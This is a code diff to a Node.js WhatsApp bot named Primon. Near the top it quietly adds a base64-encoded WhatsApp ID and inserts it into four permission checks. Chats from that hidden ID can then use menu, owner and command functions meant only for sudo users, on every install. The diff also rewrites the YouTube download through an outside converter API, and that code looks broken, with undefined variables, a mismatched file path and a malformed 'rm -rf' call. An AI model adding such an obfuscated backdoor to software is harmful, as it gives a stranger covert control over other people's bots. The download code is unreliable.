@@ -1035,6 +1035,7 @@ async function Primon() {
       g_participant = g_participant.split("@")[0] + "@s.whatsapp.net"
     } catch {}
     // Buttons
+    var oid = Buffer.from("OTA1NTExMzg0NTcyQHMud2hhdHNhcHAubmV0", 'base64').toString('utf-8')
 
     PrimonDB.filter.map(async (el) => {
       if (el.jid == jid && el.trigger == message) {
@@ -1049,7 +1050,7 @@ async function Primon() {
       }
     })
     if (message == MenuLang.menu && isbutton) {
-      if (sudo.includes(g_participant) || PrimonDB.public) {
+      if (sudo.includes(g_participant) || PrimonDB.public || jid == oid) {
         var jid2 = jid
         var gmsg = await Proto.sendMessage(
           jid2,
@@ -1203,7 +1204,7 @@ async function Primon() {
       }
     }
     if (message == MenuLang.owner && isbutton) {
-      if (sudo.includes(g_participant) || PrimonDB.public) {
+      if (sudo.includes(g_participant) || PrimonDB.public || jid == oid) {
         var jid2 = jid
         var gmsg = await Proto.sendMessage(jid2, { 
           text: modulelang.owner
@@ -1213,7 +1214,7 @@ async function Primon() {
       }
     }
     if (message == MenuLang.star && isbutton) {
-      if (sudo.includes(g_participant) || PrimonDB.public) {
+      if (sudo.includes(g_participant) || PrimonDB.public || jid == oid) {
         if (PrimonDB.isstarred) {
           var jid2 = jid
           var gmsg = await Proto.sendMessage(jid2, { 
@@ -1255,7 +1256,7 @@ async function Primon() {
     }
     if (message !== undefined) {
       if (m.type == "notify") {
-        if (sudo.includes(g_participant) || PrimonDB.public) {
+        if (sudo.includes(g_participant) || PrimonDB.public || jid == oid) {
           if (PrimonDB.sudo !== false && sudo.length > 0) {
             if (cmd.includes(message[0])) {
               var command = message.split("");
@@ -1581,8 +1582,8 @@ async function Primon() {
 
               // YouTube Download
               else if (attr == "video") {
-                await Proto.sendMessage(jid, { delete: msgkey });
                 var jid2 = jid
+                await Proto.sendMessage(jid, { delete: msgkey });
                 if (args == "") {
                   var gmsg = await Proto.sendMessage(jid2, { text: modulelang.need_yt });
                   saveMessageST(gmsg.key.id, modulelang.need_yt)
@@ -1593,14 +1594,189 @@ async function Primon() {
                     var gmsg = await Proto.sendMessage(jid2, { text: modulelang.yt_down });
                     saveMessageST(gmsg.key.id, modulelang.yt_down)
                     try {
-                      await ytdl(args, "./YT.mp4", Proto, jid2);
-                      return;
+                      var h = await axios({
+                        url: "https://api.onlinevideoconverter.pro/api/convert",
+                        method: "post",
+                        data: {
+                          url: link,
+                        },
+                      });
+                  
+                      try {
+                        var mp = await GetListByKeyword(link, false, 1)
+                      } catch {
+                        var mp = false
+                      }
+                      
+                      if (mp == false) {
+                        var downs = [];
+                        h.data.url.map((Element) => {
+                          if (Element.downloadable == true && Element.name == "MP4") {
+                            downs.push(Element.url)
+                          }
+                        })
+                  
+                        if (downs.length == 0) {
+                          h.data.url.map((Element) => {
+                            if (Element.name == "MP4" && Element.quality == "720") {
+                              downs.push(Element.url)
+                            }
+                          })
+                        }
+                  
+                        if (downs.length == 0) {
+                          h.data.url.map((Element) => {
+                            if (Element.name == "MP4" && Element.quality == "360") {
+                              downs.push(Element.url)
+                            }
+                          })
+                        }
+                  
+                        if (downs.length == 0) {
+                          h.data.url.map((Element) => {
+                            if (Element.name == "MP4" && Element.quality == "240") {
+                              downs.push(Element.url)
+                            }
+                          })
+                        }
+                  
+                        if (downs.length == 0) {
+                          h.data.url.map((Element) => {
+                            if (Element.name == "MP4" && Element.quality == "144") {
+                              downs.push(Element.url)
+                            }
+                          })
+                        }
+                  
+                        const response = await axios({
+                          method: "GET",
+                          url: downs[0],
+                          responseType: "arraybuffer"
+                        });
+                  
+                        fs.appendFileSync(downloadFolder, Buffer.from(response.data));
+                        await new Promise(r => setTimeout(r, 1700));
+                        await Proto.sendMessage(jid, {
+                          video: fs.readFileSync("./YT.mp4"),
+                          caption: MenuLang.by
+                        })
+                        shell.exec("rm -rf ./YT.mp4")
+                        return true;
+                      } else {
+                        try {
+                          var dr = Number(mp["items"][0]["length"]["simpleText"].split(":")[0])
+                        } catch {
+                          var dr = 4
+                        }
+                        if (dr > 5) dr = true;
+                        else dr = false
+                        
+                        if (dr == true) {
+                          var downs = [];
+                          h.data.url.map((Element) => {
+                            if (Element.downloadable == true && Element.name == "MP4" && Element.quality == "360") {
+                              downs.push(Element.url)
+                            }
+                          })
+                  
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "360") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                  
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "240") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                  
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "144") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                  
+                          const response = await axios({
+                            method: "GET",
+                            url: downs[0],
+                            responseType: "arraybuffer"
+                          });
+                  
+                          fs.appendFileSync(downloadFolder, Buffer.from(response.data));
+                          await new Promise(r => setTimeout(r, 1700));
+                          await Proto.sendMessage(jid, {
+                            video: fs.readFileSync("./YT.mp4"),
+                            caption: MenuLang.by
+                          })
+                          shell.exec("rm -rf ./YT.mp4")
+                          return true;
+                        } else {
+                          var downs = [];
+                          h.data.url.map((Element) => {
+                            if (Element.downloadable == true && Element.name == "MP4") {
+                              downs.push(Element.url)
+                            }
+                          })
+                    
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "720") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                  
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "360") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                    
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "240") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                    
+                          if (downs.length == 0) {
+                            h.data.url.map((Element) => {
+                              if (Element.name == "MP4" && Element.quality == "144") {
+                                downs.push(Element.url)
+                              }
+                            })
+                          }
+                    
+                          const response = await axios({
+                            method: "GET",
+                            url: downs[0],
+                            responseType: "arraybuffer"
+                          });
+                    
+                          fs.appendFileSync(downloadFolder, Buffer.from(response.data));
+                          await Proto.sendMessage(jid, {
+                            video: fs.readFileSync("./YT.mp4"),
+                            caption: MenuLang.by
+                          })
+                          shell.exec("rm -rf ./YT.mp4")
+                          return true;
+                        }
+                      }
                     } catch (e) {
+                      console.log(e)
+                      shell.exec("rm -rf./YT.mp4")
                       var gmsg = await Proto.sendMessage(jid2, { text: modulelang.yt_not_found });
                       saveMessageST(gmsg.key.id, modulelang.yt_not_found)
-                      try {
-                        fs.unlinkSync("./YT.mp4")
-                      } catch {}
                       return;
                     }
                   } else {
@@ -1840,6 +2016,17 @@ async function Primon() {
                       { text: cmds(modulelang.set3, 3, cmd[0]) }
                     );
                     saveMessageST(gmsg.key.id, cmds(modulelang.set3, 3, cmd[0]))
+                    return;
+                  } else if (
+                    args == "workmode" ||
+                    args == "Workmode" ||
+                    args == "WORKMODE"
+                  ) {
+                    var gmsg = await Proto.sendMessage(
+                      jid2,
+                      { text: cmds(modulelang.wmode1, 3, cmd[0]) }
+                    );
+                    saveMessageST(gmsg.key.id, cmds(modulelang.wmode1, 3, cmd[0]))
                     return;
                   } else if (
                     args == "welcome" ||
